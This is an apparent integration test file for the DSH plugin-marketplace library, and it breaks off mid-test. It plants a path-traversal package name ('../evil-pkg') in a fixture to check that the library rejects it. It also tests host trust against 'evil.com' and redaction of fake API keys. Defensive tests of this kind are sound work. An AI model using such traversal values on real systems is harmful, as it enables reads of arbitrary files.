#!/usr/bin/env node
// lib/index.js 导出函数全覆盖测试：mock fetch + 临时 DSH_HOME + 假 ctx。
// 运行：node scripts/tests/integration/lib.test.mjs（或 node scripts/tests/run.mjs --level=integration）
// 与 smoke-tests.mjs 共用 check() 风格；coverage.mjs 同时统计两者。
// 注意：必须用动态 import 控制加载顺序——静态 import 会被提升，lib/index.js
// 求值时 process.env.DSH_HOME 尚未设置，模块级常量会回退到真实 ~/.dsh（污染主目录）。

import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, renameSync, rmSync, chmodSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { join, dirname, sep } from "node:path";
import { tmpdir } from "node:os";

// ---- mock 基建：临时 DSH_HOME（必须在 import lib 之前设置）----
process.env.DSH_HOME = mkdtempSync(join(tmpdir(), "dsh-libtest-")).replace(/\\/g, "/");
// 预写 installed.json（loadInstalled 在模块加载时执行）：注入一条已安装记录，
// 供 restore/webdav 的 already 分支判定（installedMap 由该文件填充）。
// 键名与全部现有断言解耦（无测试引用该仓库名）。
mkdirSync(join(process.env.DSH_HOME, "marketplace"), { recursive: true });
writeFileSync(join(process.env.DSH_HOME, "marketplace", "installed.json"), JSON.stringify({
  "none/already-installed": { type: "skill", name: "already-installed", location: join(process.env.DSH_HOME, "skills", "already-installed"), installedAt: Date.now() },
  // check-update 场景：npm 型 cli 安装记录（name 为 npm 包名，非 owner/repo）
  "none/cli-pkg": { type: "cli", name: "demo-npm-pkg", location: join(process.env.DSH_HOME, "profiles", "web", "node_modules", "demo-npm-pkg"), installedAt: Date.now() },
  // list handler cliNpmForm 穿越防御场景：name 为非法形态（../ 穿越）——篡改 installed.json
  // 时 split("/") 拼 node_modules 会读任意目录；防御分支应拒绝（installedVersion null）
  "none/cli-evil": { type: "cli", name: "../evil-pkg", location: join(process.env.DSH_HOME, "profiles", "web", "node_modules", "evil-pkg"), installedAt: Date.now() }
}, null, 2), "utf8");
// check-update 的已装版本读取：PROFILE_NM/<pkgName>/package.json（v1.4.10 起 npm 型 cli
// 版本检测改手动触发）——预写 1.0.0，npm registry mock 返回 2.0.0 → updateAvailable
mkdirSync(join(process.env.DSH_HOME, "profiles", "web", "node_modules", "demo-npm-pkg"), { recursive: true });
writeFileSync(join(process.env.DSH_HOME, "profiles", "web", "node_modules", "demo-npm-pkg", "package.json"), JSON.stringify({ name: "demo-npm-pkg", version: "1.0.0" }), "utf8");
// 预写 feedback.json（apply 时 loadFeedback 异步读入）：注入一条 pending 反馈，
// 供 feedback 提交 handler 的 GitHub 自动建 issue 分支（doCreate）判定。
writeFileSync(join(process.env.DSH_HOME, "marketplace", "feedback.json"), JSON.stringify({
  pending: [
    { repo: "none/feedback-repo", name: "feedback-repo", type: "skill", version: "1.0.0", installedAt: Date.now() },
    { repo: "none/feedback-repo2", name: "feedback-repo2", type: "skill", version: "1.0.0", installedAt: Date.now() }
  ],
  token: ""
}, null, 2), "utf8");

let pass = 0, fail = 0;
function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++;
  else {
    fail++;
    console.log(`FAIL ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
  }
}

// ---- mock：全局 fetch ----
function mockFetch(payload, status = 200) {
  const orig = globalThis.fetch;
  globalThis.fetch = async () => ({
    ok: status >= 200 && status < 300,
    status,
    json: async () => payload,
    text: async () => (typeof payload === "string" ? payload : JSON.stringify(payload)),
    // readBodyLimited 无 body.reader 时的回退（mock 无流式 body）
    arrayBuffer: async () => Buffer.from(typeof payload === "string" ? payload : JSON.stringify(payload)),
  });
  return orig;
}
/** 同 mockFetch，但捕获每次请求的 JSON body（断言 issue 模板渲染用）。返回 { orig, bodies }。 */
function mockFetchCapture(payload, status = 200) {
  const orig = globalThis.fetch;
  const bodies = [];
  globalThis.fetch = async (url, opts) => {
    if (opts?.body) {
      try { bodies.push(JSON.parse(String(opts.body))); } catch { bodies.push(null); }
    }
    return {
      ok: status >= 200 && status < 300,
      status,
      json: async () => payload,
      text: async () => (typeof payload === "string" ? payload : JSON.stringify(payload)),
      arrayBuffer: async () => Buffer.from(typeof payload === "string" ? payload : JSON.stringify(payload)),
    };
  };
  return { orig, bodies };
}

(async () => {
  const lib = await import("../../../lib/index.js");

  // ==================== 纯函数 ====================
  check("isSensitiveEnvKey GITHUB_TOKEN", lib.isSensitiveEnvKey("GITHUB_TOKEN"), true);
  check("isSensitiveEnvKey PATH", lib.isSensitiveEnvKey("PATH"), false);
  check("buildMinimalEnv 过滤", lib.buildMinimalEnv({ GITHUB_TOKEN: "x", PATH: "y" }).PATH !== undefined, true);
  check("looksLikeDshPlugin 插件", lib.looksLikeDshPlugin({ dsh: {} }), true);
  check("normalizeRepoRef 前缀", lib.normalizeRepoRef("https://github.com/a/b"), "a/b");
  check("normalizeRepoRef 裸", lib.normalizeRepoRef("a/b"), "a/b");
  check("hasPatchEntry 存在", lib.hasPatchEntry("name: b", "b"), true);
  check("hasPatchEntry 缺失", lib.hasPatchEntry("name: a", "b"), false);
  check("normalizeRepo github", lib.normalizeRepo({ full_name: "owner/repo", html_url: "https://github.com/owner/repo" }).full_name, "owner/repo");
  // 回归:插件市场(dsh)模式不得输出 has_skill(否则满屏「未验证」);skills 模式保留三态
  check("normalizeRepo dsh 无 has_skill", "has_skill" in lib.normalizeRepo({ full_name: "a/b", has_skill: null }), false);
  check("normalizeRepo skills 保留三态", lib.normalizeRepo({ full_name: "a/b", has_skill: null }, "skills").has_skill, null);
  check("normalizeRepo skills true", lib.normalizeRepo({ full_name: "a/b", has_skill: true }, "skills").has_skill, true);
  // 回归:构建期盖章字段必须透传(否则徽章永不显示——market_tags/installable 被 normalizeRepo 丢掉)
  check("normalizeRepo 透传 market_tags", JSON.stringify(lib.normalizeRepo({ full_name: "a/b", market_tags: ["verified-install"] }).market_tags), JSON.stringify(["verified-install"]));
  check("normalizeRepo 透传 installable", lib.normalizeRepo({ full_name: "a/b", installable: "manual" }).installable, "manual");
  check("normalizeRepo 忽略无关 installable", lib.normalizeRepo({ full_name: "a/b", installable: "cordis-plugin" }).installable, undefined);
  check("compareVersions 基础", lib.compareVersions("1.0.0", "1.0.1"), -1);
  check("isTrustedHost 本地", lib.isTrustedHost("127.0.0.1:3080"), true);
  check("isTrustedHost 外网", lib.isTrustedHost("evil.com:3080"), false);
  check("isPnpmLocalDependency link", lib.isPnpmLocalDependency("link:../x"), true);
  check("isPnpmLocalDependency 版本", lib.isPnpmLocalDependency("^1.0.0"), false);
  check("langOf zh", lib.langOf({ headers: {} }, "zh-CN"), "zh");
  check("t 中文键", typeof lib.t("zh", "install"), "string");
  check("normalizeRepo 对象入参", lib.normalizeRepo({ full_name: "a/b", html_url: "https://github.com/a/b" }).full_name, "a/b");
  check("sanitizeManifest 返回类型", typeof lib.sanitizeManifest({ name: "x" }), "object");

  // ---- scanCliInstallHint（README 官方 CLI 安装指令识别）----
  const cliDir = join(process.env.DSH_HOME, "cli-hint");
  mkdirSync(cliDir, { recursive: true });
  writeFileSync(join(cliDir, "README.md"), [
    "# Demo",
    "",
    "## 安装",
    "```bash",
    "dsh plugin install owner/demo-plugin",
    "```",
    "也可以 `dsh plugin add owner/demo-plugin`"
  ].join("\n"), "utf8");
  check("cliHint 命中 install 指令", await lib.scanCliInstallHint(cliDir, "owner/demo-plugin"), "dsh plugin install owner/demo-plugin");
  check("cliHint 大小写不敏感", await lib.scanCliInstallHint(cliDir, "OWNER/Demo-Plugin"), "dsh plugin install owner/demo-plugin");
  check("cliHint 其他仓库不命中", await lib.scanCliInstallHint(cliDir, "other/repo"), null);
  // dsh-market 实测写法：flags 在动词前 + 用 npm 包名（`dsh plugin --profile web add dshmarket`）
  const cliFlagsDir = join(process.env.DSH_HOME, "cli-flags");
  mkdirSync(cliFlagsDir, { recursive: true });
  writeFileSync(join(cliFlagsDir, "package.json"), JSON.stringify({ name: "dshmarket", version: "1.0.0", dsh: {} }), "utf8");
  writeFileSync(join(cliFlagsDir, "README.md"), "Install:\n```bash\ndsh plugin --profile web add dshmarket\n```\n", "utf8");
  check("cliHint flags+包名 写法", await lib.scanCliInstallHint(cliFlagsDir, "dsh-market/dsh-market"), "dsh plugin --profile web add dshmarket");
  // 负例：README 指令指向别的包/仓库时不提示（候选 = 仓库全名/仓库名/本包 package.json 的 name）
  const cliOtherDir = join(process.env.DSH_HOME, "cli-other");
  mkdirSync(cliOtherDir, { recursive: true });
  writeFileSync(join(cliOtherDir, "package.json"), JSON.stringify({ name: "dshmarket", version: "1.0.0", dsh: {} }), "utf8");
  writeFileSync(join(cliOtherDir, "README.md"), "Install with:\n```bash\ndsh plugin add somebody-else/another-market\n```\n", "utf8");
  check("cliHint 指令指向他包不命中", await lib.scanCliInstallHint(cliOtherDir, "dsh-market/dsh-market"), null);

  // ---- findCliInstall（安装流程执行用：tier-1 本仓库包 / tier-2 README 首条指令）----
  const cliExec1 = await lib.findCliInstall(cliDir, "owner/demo-plugin");
  check("findCliInstall tier-1 命中本仓库", cliExec1 && cliExec1.target, "owner/demo-plugin");
  check("findCliInstall tier-1 verb", cliExec1 && cliExec1.verb, "install");
  const cliExec2 = await lib.findCliInstall(cliFlagsDir, "dsh-market/dsh-market");
  check("findCliInstall tier-1 包名命中", cliExec2 && cliExec2.target, "dshmarket");
  // tier-2：README 首条指令指向聚合发布包（dsh-web-ui 场景）——scanCliInstallHint 不提示但执行路径采用
  const cliTier2Dir = join(process.env.DSH_HOME, "cli-tier2");
  mkdirSync(cliTier2Dir, { recursive: true });
  writeFileSync(join(cliTier2Dir, "package.json"), JSON.stringify({ name: "dsh-web-ui", version: "1.0.0", dsh: {} }), "utf8");
  writeFileSync(join(cliTier2Dir, "README.md"), "## 安装\n推荐聚合包:\n```bash\ndsh plugin --profile web add @linxin666/dsh-web-ui-all\n```\n", "utf8");
  const cliTier2 = await lib.findCliInstall(cliTier2Dir, "zhu1090093659/dsh-web-ui");
  check("findCliInstall tier-2 采用 README 首条指令", cliTier2 && cliTier2.target, "@linxin666/dsh-web-ui-all");
  check("findCliInstall tier-2 verb=add", cliTier2 && cliTier2.verb, "add");
  check("findCliInstall tier-2 时 scanCliInstallHint 仍为 null", await lib.scanCliInstallHint(cliTier2Dir, "zhu1090093659/dsh-web-ui"), null);
  const cliNone = await lib.findCliInstall(join(process.env.DSH_HOME, "cli-none-dir"), "owner/demo-plugin");
  check("findCliInstall 无指令 null", cliNone, null);

  // 相对路径/本地路径指令拒绝（dsh-deep-whale 场景：README 的 `add ../dsh-deep-whale/maid-atelier`
  // 是作者本地开发用法，依赖 cwd——市场代执行只会装出死链接，必须跳过）
  const cliRelDir = join(process.env.DSH_HOME, "cli-relpath");
  mkdirSync(cliRelDir, { recursive: true });
  writeFileSync(join(cliRelDir, "package.json"), JSON.stringify({ name: "demo-rel", version: "1.0.0", dsh: {} }), "utf8");
  writeFileSync(join(cliRelDir, "README.md"), [
    "# demo-rel",
    "## 安装",
    "```bash",
    "dsh plugin --profile web add ../demo-rel/maid-atelier",
    "```",
    "或本地绝对路径:",
    "```bash",
    "dsh plugin add C:\\work\\demo-rel\\maid-atelier",
    "```",
  ].join("\n"), "utf8");
  check("findCliInstall 相对路径不采用", await lib.findCliInstall(cliRelDir, "owner/demo-rel"), null);
  check("scanCliInstallHint 相对路径不提示", await lib.scanCliInstallHint(cliRelDir, "owner/demo-rel"), null);

  // ---- scanExternalCliHint（第三方 CLI 官方 DSH 接入指令识别，open-design 场景：
  // README 提供 `od agent setup deepseek-harness`，但市场无法代执行——只作展示提示）----
  const extCliDir = join(process.env.DSH_HOME, "cli-external");
  mkdirSync(extCliDir, { recursive: true });
  writeFileSync(join(extCliDir, "package.json"), JSON.stringify({ name: "open-design", version: "1.0.0" }), "utf8");
  writeFileSync(join(extCliDir, "README.md"), [
    "| [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) | ✅ Native runtime | `od agent setup deepseek-harness` |",
    "For DeepSeek Harness, install the official `dsh` CLI first, then select it in Open Design or run `od agent setup deepseek-harness` to install/repair OD's connection component.",
  ].join("\n"), "utf8");
  const extHint = await lib.scanExternalCliHint(extCliDir);
  check("externalCliHint 识别 od 指令", extHint && extHint.cli, "od");
  check("externalCliHint 命令完整", extHint && extHint.command, "od agent setup deepseek-harness");
  // 第三方 CLI 接入指令不应被当成 dsh plugin 安装指令（不执行、不提示为等效安装）
  check("externalCliHint 不影响 scanCliInstallHint", await lib.scanCliInstallHint(extCliDir, "nexu-io/open-design"), null);
  check("externalCliHint 不影响 findCliInstall", await lib.findCliInstall(extCliDir, "nexu-io/open-design"), null);
  // dsh 自身的 setup 指令不落入第三方扫描
  const extDshDir = join(process.env.DSH_HOME, "cli-external-dsh");
  mkdirSync(extDshDir, { recursive: true });
  writeFileSync(join(extDshDir, "README.md"), "```bash\ndsh agent setup deepseek-harness\n```\n", "utf8");
  check("externalCliHint 忽略 dsh 自身", await lib.scanExternalCliHint(extDshDir), null);
  check("externalCliHint 无指令目录 null", await lib.scanExternalCliHint(join(process.env.DSH_HOME, "nope")), null);

  // ---- findPresetRoots / 嵌套预设识别（dsh-anchored-standard 场景）----
  const presetNestedDir = join(process.env.DSH_HOME, "preset-nested");
  mkdirSync(join(presetNestedDir, "preset"), { recursive: true });
  mkdirSync(join(presetNestedDir, "whoami-standard"), { recursive: true });
  writeFileSync(join(presetNestedDir, "package.json"), JSON.stringify({ name: "demo-preset-nested", version: "1.0.0" }), "utf8");
  for (const sub of ["preset", "whoami-standard"]) {
    writeFileSync(join(presetNestedDir, sub, "preset.yml"), "# p\n", "utf8");
    writeFileSync(join(presetNestedDir, sub, "agent.cordis.yml"), "# a\n", "utf8");
  }
  const presetRoots = await lib.findPresetRoots(presetNestedDir);
  check("findPresetRoots 发现 2 个嵌套预设", presetRoots.length, 2);
  check("findPresetRoots 含 preset 目录", presetRoots.some((r) => r.endsWith("preset")), true);
  check("detectType 嵌套预设 → agent-preset", await lib.detectType(presetNestedDir), "agent-preset");
  const presetRootDir = join(process.env.DSH_HOME, "preset-root");
  mkdirSync(presetRootDir, { recursive: true });
  writeFileSync(join(presetRootDir, "preset.yml"), "# p\n", "utf8");
  writeFileSync(join(presetRootDir, "agent.cordis.yml"), "# a\n", "utf8");
  check("detectType 根预设仍 agent-preset", await lib.detectType(presetRootDir), "agent-preset");

  // ---- bundle 声明包 → detectType 判 bundle（cordis 子类型）----
  const bundleDir = join(process.env.DSH_HOME, "bundle-detect");
  mkdirSync(bundleDir, { recursive: true });
  writeFileSync(join(bundleDir, "package.json"), JSON.stringify({
    name: "fake-bundle-detect", version: "1.0.0", dsh: { bundle: { patch: "./cordis.patch.yml" } },
  }), "utf8");
  writeFileSync(join(bundleDir, "cordis.patch.yml"), "- insert:\n    - id: fake-sub\n      name: '@fake/sub-pkg'\n", "utf8");
  check("detectType bundle 声明 → bundle", await lib.detectType(bundleDir), "bundle");
  // 对照组：dsh 声明但非 bundle → cordis-plugin（不变）
  const cordisDir = join(process.env.DSH_HOME, "cordis-detect");
  mkdirSync(cordisDir, { recursive: true });
  writeFileSync(join(cordisDir, "package.json"), JSON.stringify({ name: "fake-cordis-detect", version: "1.0.0", dsh: { client: {} } }), "utf8");
  check("detectType 非 bundle dsh 声明 → cordis-plugin（不变）", await lib.detectType(cordisDir), "cordis-plugin");
  // 边界：bundle 声明但 install.ps1 也在根 → 声明优先（bundle 形态防脚本劫持，B1 同款语义）
  const bundleScriptDir = join(process.env.DSH_HOME, "bundle-script-detect");
  mkdirSync(bundleScriptDir, { recursive: true });
  writeFileSync(join(bundleScriptDir, "package.json"), JSON.stringify({
    name: "fake-bundle-script", version: "1.0.0", dsh: { bundle: { patch: "./cordis.patch.yml" } },
  }), "utf8");
  writeFileSync(join(bundleScriptDir, "cordis.patch.yml"), "- insert:\n", "utf8");
  writeFileSync(join(bundleScriptDir, "install.ps1"), "# x\n", "utf8");
  check("detectType bundle 声明 + install.ps1 → bundle（声明优先）", await lib.detectType(bundleScriptDir), "bundle");

  // ---- classifyInstallFailure（失败分类提示）----
  check("分类 EINTEGRITY", lib.classifyInstallFailure("npm ERR! code EINTEGRITY\nintegrity checksum failed").includes("完整性"), true);
  check("分类 node-gyp", lib.classifyInstallFailure("gyp ERR! stack Error: not found: python3").includes("node-gyp"), true);
  check("分类 网络", lib.classifyInstallFailure("fetch failed: ENOTFOUND registry.npmjs.org", "zh").includes("网络"), true);
  check("分类 版本不存在", lib.classifyInstallFailure("No matching version found for dep@9.9.9").includes("版本不存在"), true);
  check("分类 缺少模块", lib.classifyInstallFailure("internal/modules/cjs/loader: Cannot find module 'foo'", "zh").includes("缺少模块"), true);
  check("分类 构建命令失败", lib.classifyInstallFailure("ERR_PNPM_LOCKFILE_UP_TO_DATE Command failed with exit code 1", "zh").includes("构建"), true);
  // issue #21：git clone 网络失败（`Command failed: git clone ... unable to access ... Couldn't connect`）
  // 必须命中网络类而非笼统的「构建/包管理命令失败」
  check("分类 git clone 网络", lib.classifyInstallFailure("Command failed: git clone --depth 1 https://github.com/a/b.git\nfatal: unable to access 'https://github.com/a/b.git/': Failed to connect to github.com port 443: Couldn't connect to server").includes("网络"), true);
  check("分类 git clone 网络 en", lib.classifyInstallFailure("fatal: unable to access: Couldn't connect to server", "en").includes("proxy"), true);
  check("分类 无匹配返回 null", lib.classifyInstallFailure("just a normal error"), null);
  check("分类 en 语言", lib.classifyInstallFailure("integrity checksum failed", "en").includes("integrity"), true);

  // ---- sanitizeLog（日志脱敏）----
  check("脱敏 Windows 主目录", lib.sanitizeLog("C:\\Users\\wyzin\\.dsh\\marketplace\\cache\\a"), "~\\<user>\\.dsh\\marketplace\\cache\\a");
  check("脱敏 Unix 主目录（保留结构隐藏用户名）", lib.sanitizeLog("cd /home/alice/dsh && pwd"), "cd ~/<user>/dsh && pwd");
  check("脱敏 sk- 密钥", lib.sanitizeLog("key=sk-ABC12345XYZ"), "key=sk-ABC123…");
  check("脱敏 ghp_ 密钥", lib.sanitizeLog("token=ghp_abcdefgh123456789"), "token=ghp_abcdef…");
  check("脱敏 AKIA", lib.sanitizeLog("AKIAIOSFODNN7EXAMPLE"), "AKIAIOSFOD…");
  check("脱敏不影响普通文本", lib.sanitizeLog("install ok: demo-plugin"), "install ok: demo-plugin");
  const cliNoHintDir = join(process.env.DSH_HOME, "cli-no-hint");
  mkdirSync(cliNoHintDir, { recursive: true });
  writeFileSync(join(cliNoHintDir, "README.md"), "# No command here\nInstall via marketplace.\n", "utf8");
  check("cliHint 无指令返回 null", await lib.scanCliInstallHint(cliNoHintDir, "owner/demo-plugin"), null);
  check("cliHint 目录不存在返回 null", await lib.scanCliInstallHint(join(process.env.DSH_HOME, "nope"), "a/b"), null);

  // ---- dedupeReposByPkgName（pkg_name 冲突消解：已装优先，其次 Star 高者）----
  // 不传 isInstalled 参数：触发默认闭包 `isInstalled = (r) => installedMap.has(r.full_name)`
  // 与内部 `rank` 闭包（isInstalled 命中时 +1e12 权重）。
  const dupRepos = [
    { full_name: "a/low", name: "low", pkg_name: "shared-pkg", stargazers_count: 5 },
    { full_name: "a/high", name: "high", pkg_name: "shared-pkg", stargazers_count: 100 },
  ];
  check("dedupe 默认参数 冲突保留高 Star", lib.dedupeReposByPkgName(dupRepos).repos.map((r) => r.full_name), ["a/high"]);
  check("dedupe 默认参数 只留一条", lib.dedupeReposByPkgName(dupRepos).repos.length, 1);
  check("dedupe 默认参数 返回 dropped 列表", lib.dedupeReposByPkgName(dupRepos).dropped, ["a/low"]);
  const dupInstalled = [
    { full_name: "x/inst", name: "inst", pkg_name: "p", stargazers_count: 0 },
    { full_name: "x/star", name: "star", pkg_name: "p", stargazers_count: 999 },
  ];
  check("dedupe 已装优先（rank 1e12 分支）", lib.dedupeReposByPkgName(dupInstalled, (r) => r.full_name === "x/inst").repos.map((r) => r.full_name), ["x/inst"]);
  check("dedupe 无 pkg_name 不冲突", lib.dedupeReposByPkgName([
    { full_name: "u/v", name: "v", stargazers_count: 1 },
    { full_name: "u/w", name: "w", stargazers_count: 2 },
  ]).repos.map((r) => r.full_name), ["u/v", "u/w"]);

  // ==================== 文件 IO（临时 DSH_HOME）====================
  // 构造临时仓库目录（含 package.json）
  const repoDir = join(process.env.DSH_HOME, "test-repo");
  mkdirSync(repoDir, { recursive: true });
  writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "test/pkg", version: "1.2.3", repository: { url: "https://github.com/test/pkg" } }));

  check("readPackageSummary name", (await lib.readPackageSummary(repoDir))?.name, "test/pkg");
  check("loadOwnRepo 返回对象或 null", (() => { const r = lib.loadOwnRepo(); return r === null || typeof r === "object"; })(), true);
  check("detectSkillInstalled 无", await lib.detectSkillInstalled("none"), false);
  check("isOfficialPackage 官方", await lib.isOfficialPackage("@deepseek-ai/dsh"), true);
  check("isOfficialPackage 非官方", await lib.isOfficialPackage("owner/x"), false);
  check("readLifecycleScripts 空返回数组", Array.isArray(await lib.readLifecycleScripts(repoDir)), true);

  // needsPluginBuild / collectExportTargets（递归收集 exports 子树全部字符串入口）
  const srcOnly = join(process.env.DSH_HOME, "src-only");
  mkdirSync(srcOnly, { recursive: true });
  writeFileSync(join(srcOnly, "package.json"), JSON.stringify({
    name: "src-only",
    version: "1.0.0",
    scripts: { build: "tsc" },
    main: "dist/index.js",
    exports: {
      ".": { import: "./dist/index.mjs", require: { default: "./dist/index.cjs" } },
      "./client": "./dist/client.js",
    },
  }));
  check("needsPluginBuild 源码缺失需构建", await lib.needsPluginBuild(srcOnly), true);
  const built = join(process.env.DSH_HOME, "built");
  mkdirSync(built, { recursive: true });
  writeFileSync(join(built, "package.json"), JSON.stringify({ name: "built", version: "1.0.0", scripts: { build: "tsc" }, main: "index.js" }));
  writeFileSync(join(built, "index.js"), "export default {}\n");
  check("needsPluginBuild main 存在不需构建", await lib.needsPluginBuild(built), false);
  const noBuild = join(process.env.DSH_HOME, "no-build");
  mkdirSync(noBuild, { recursive: true });
  writeFileSync(join(noBuild, "package.json"), JSON.stringify({ name: "no-build", version: "1.0.0", main: "index.js" }));
  check("needsPluginBuild 无 build 脚本", await lib.needsPluginBuild(noBuild), false);

  // scanProfilePackages：隐藏目录（.xxx）不抢包名映射 key（v1.5.1 升级事故回归——
  // node_modules 里的 .backup 目录含同包名旧版，readdir 点开头排序在前 + 「只补缺不覆盖」
  // 会让旧版抢走 key，列表持续显示旧已装版本）
  {
    const nm = join(process.env.DSH_HOME, "profiles", "web", "node_modules");
    mkdirSync(join(nm, ".backup-old"), { recursive: true });
    mkdirSync(join(nm, "shadow-pkg"), { recursive: true });
    writeFileSync(join(nm, ".backup-old", "package.json"), JSON.stringify({ name: "shadow-pkg", version: "1.4.12" }));
    writeFileSync(join(nm, "shadow-pkg", "package.json"), JSON.stringify({ name: "shadow-pkg", version: "1.5.1" }));
    const scannedMap = await lib.scanProfilePackages();
    check("隐藏备份目录不抢包名映射 key", scannedMap.get("shadow-pkg")?.version, "1.5.1");
    check("隐藏备份目录自身不进映射", scannedMap.has(".backup-old"), false);
  }

  // scanProfilePackages（Map 类型）
  const scanned = await lib.scanProfilePackages();
  check("scanProfilePackages 是 Map", scanned instanceof Map, true);

  // matchProfileEntry（Map profile + repo 对象 + keys）
  const prof = new Map([["a/b", { name: "a/b", version: "1.0.0", repository: "a/b" }]]);
  const matched = await lib.matchProfileEntry(prof, { full_name: "a/b" }, ["a/b"]);
  check("matchProfileEntry 命中", matched?.name, "a/b");
  const matchedNull = await lib.matchProfileEntry(new Map(), { full_name: "x/y" }, ["x/y"]);
  check("matchProfileEntry 未命中", matchedNull, null);

  // detectInstalled（repo 对象，返回 boolean；无安装记录 → false）
  // mock fetch：detectInstalled → loadOfficialPackages 枚举失败回退 registry/搜索 API——
  // 真实 fetch 在限流/慢网下会拖死测试（coverage 环境实测 403 + 分页重试 → 超时）。
  const origDetect = mockFetch({ items: [], total_count: 0 });
  check("detectInstalled 未装", await lib.detectInstalled({ full_name: "none/repo", name: "repo" }), false);
  check("detectInstalled 类型", typeof (await lib.detectInstalled({ full_name: "owner/repo", name: "repo" })), "boolean");
  globalThis.fetch = origDetect;

  // appendPatchEntry（entryId + pkgName，返回 boolean 是否追加）
  mkdirSync(join(process.env.DSH_HOME, "profiles", "web"), { recursive: true });
  const appended = await lib.appendPatchEntry("test-entry", "test/pkg");
  check("appendPatchEntry 返回布尔", typeof appended, "boolean");
  // issue #71/#73 回归：官方默认「注释 + []」形态追加 insert 块后必须是合法 YAML
  // （修复前直接追加产生「[] 后跟块序列项」→ DSH 启动解析崩溃）
  {
    const patchFile = join(process.env.DSH_HOME, "profiles", "web", "cordis.patch.yml");
    writeFileSync(patchFile, "# a top-level YAML array of load overrides, disables, and inserts\n[]\n", "utf8");
    const ok = await lib.appendPatchEntry("reg-entry", "reg/pkg");
    const text = readFileSync(patchFile, "utf8");
    check("appendPatchEntry 默认注释+[] 形态追加成功", ok, true);
    check("appendPatchEntry 清掉裸 [] 行（flow 序列不残留）", !/^\s*\[\]\s*$/m.test(text), true);
    check("appendPatchEntry 追加后是合法 YAML", /^- insert:\s*$\s*  - id: reg-entry\s*  name: reg\/pkg/m.test(text), true);
    // #82 深层回归防护：形状正则可能放过「裸 [] 行未清净」的错位（流式序列残留悄悄回归）。
    // 语义级脊柱断言：首个非注释顶层节点必须是插入块，且不得是 flow 空序列残留——
    // 这是 DSH loader 解析 patch 文件成败的根（残留 [] 在前会让 loader 把 [] 当整个补丁，
    // 或把后续 insert 当作非法文档成员 → 启动解析崩溃，issue #71/#73/#82 同源）。
    const firstTop = text.split("\n").filter((l) => !/^\s*#/.test(l)).find((l) => l.trim() !== "");
    check("appendPatchEntry 顶层首节点为插入块且无 [] 残留", Boolean(firstTop && firstTop.startsWith("- insert") && !/^\[\]\s*$/.test(firstTop)), true);
  }

  // ---- issue #134：bundle 声明包注册路径（installRepo + pnpm stub + uninstall handler）----
  {
    const stubDir = mkdtempSync(join(tmpdir(), "dsh-pnpm-stub-"));
    const stubJs = 'const fs=require("fs"),path=require("path");const argv=process.argv.slice(2);const cwd=process.cwd();'
      + 'let mode="";try{mode=fs.readFileSync(path.join(__dirname,"mode"),"utf8").trim()}catch(e){}'
      + 'if(argv[0]==="install"){const m=JSON.parse(fs.readFileSync(path.join(cwd,"package.json"),"utf8"));'
      + 'for(const n of Object.keys(m.dependencies||{})){const v=m.dependencies[n];'
      + 'if(mode==="fail-nocreate"&&(v==="1.2.5"||String(v).startsWith("github:fake/")))process.exit(1);'
      + 'if(v==="1.2.3"||v==="1.2.4"||v==="1.2.5"||String(v).startsWith("github:fake/")){'
      + 'const d=path.join(cwd,"node_modules",...n.split("/"));fs.mkdirSync(d,{recursive:true});'
      + 'const p=path.join(d,"package.json");let main="";'
      + 'try{main=fs.readFileSync(path.join(__dirname,"entry"),"utf8").trim()}catch(e){}'
      + 'if(!fs.existsSync(p)){const pk={name:n,version:"1.2.3"};if(main){try{const e=JSON.parse(main);'
      + 'if(e.main){pk.main=e.main;'
      + 'const dir=path.join(d,path.dirname(e.main));fs.mkdirSync(dir,{recursive:true});'
      + 'const f=path.join(d,e.main);if(!fs.existsSync(f))fs.writeFileSync(f,"export function apply(_ctx) {}");}'
      + 'if(e.deps)pk.dependencies=e.deps;}catch(err){pk.main=main;}}'
      + 'fs.writeFileSync(p,JSON.stringify(pk));}}'
      + '}if(mode==="fail-create")process.exit(1);}'
      + 'else if(argv[0]==="remove"){const n=argv.slice(1).filter((a)=>!a.startsWith("--"))[0];'
      + 'if(mode==="fail-remove")process.exit(1);'
      + 'fs.rmSync(path.join(cwd,"node_modules",...n.split("/")),{recursive:true,force:true});'
      + 'const m=JSON.parse(fs.readFileSync(path.join(cwd,"package.json"),"utf8"));'
      + 'if(m.dependencies)delete m.dependencies[n];'
      + 'if(m.dsh&&m.dsh.profile&&Array.isArray(m.dsh.profile.bundles))m.dsh.profile.bundles=m.dsh.profile.bundles.filter((b)=>b!==n);'
      + 'fs.writeFileSync(path.join(cwd,"package.json"),JSON.stringify(m,null,2));}';
    writeFileSync(join(stubDir, "pnpm.js"), stubJs, "utf8");
    writeFileSync(join(stubDir, "pnpm.cmd"), "@echo off\r\nnode \"%~dp0pnpm.js\" %*\r\nexit /b %ERRORLEVEL%\r\n", "utf8");
    writeFileSync(join(stubDir, "pnpm"), "#!/bin/sh\nnode \"$(dirname \"$0\")/pnpm.js\" \"$@\"\n", "utf8");
    if (process.platform !== "win32") chmodSync(join(stubDir, "pnpm"), 0o755); // CI（Linux）需要可执行位，否则 execFile spawn EACCES
    const savedPath = process.env.PATH;
    process.env.PATH = `${stubDir}${process.platform === "win32" ? ";" : ":"}${savedPath ?? ""}`;
    const makeFixture = (name, version, bundle) => {
      const dir = join(process.env.DSH_HOME, `${name}-fixture`);
      mkdirSync(join(dir, "lib"), { recursive: true });
      writeFileSync(join(dir, "package.json"), JSON.stringify({
        name, version, main: "lib/index.js",
        dsh: bundle ? { bundle: { patch: "./cordis.patch.yml" } } : { client: {} },
      }, null, 2), "utf8");
      writeFileSync(join(dir, "lib", "index.js"), "export function apply(_ctx) {}\n", "utf8");
      if (bundle) writeFileSync(join(dir, "cordis.patch.yml"), "- insert:\n    - id: fake-sub\n      name: '@fake/sub-pkg'\n", "utf8");
      return dir;
    };
    try {
      const web = join(process.env.DSH_HOME, "profiles", "web");
      mkdirSync(web, { recursive: true });
      writeFileSync(join(web, "package.json"), JSON.stringify({
        name: "web-profile", version: "1.0.0",
        dependencies: { "dsh-plugin-marketplace": "github:bradeGithub/DSH-Plugins-Marketplace" },
        dsh: { profile: { bundles: ["dsh-plugin-marketplace"] } },
      }, null, 2), "utf8");
